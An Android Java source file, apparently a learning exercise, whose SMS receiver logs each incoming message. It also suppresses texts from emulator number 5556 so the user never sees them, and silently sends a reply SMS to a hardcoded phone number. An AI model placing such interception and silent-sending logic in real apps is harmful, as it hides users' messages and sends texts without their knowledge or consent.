package com.ecarx.sdstatusreceiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;

public class SmsReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        System.out.println("短信到来了.");
        Object[] objs = (Object[]) intent.getExtras().get("pdus");
        for(Object obj : objs){
            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) obj);
            String sender = smsMessage.getOriginatingAddress();
            String body = smsMessage.getMessageBody();
            System.out.println("sender:"+sender);
            System.out.println("body:"+body);

            if(sender.contains("5556")){
                //拦截掉 5556发来的全部短信
                abortBroadcast();
                SmsManager.getDefault().sendTextMessage("17682713701",
                        null,"fake u",null,null);
            }
        }
    }
}
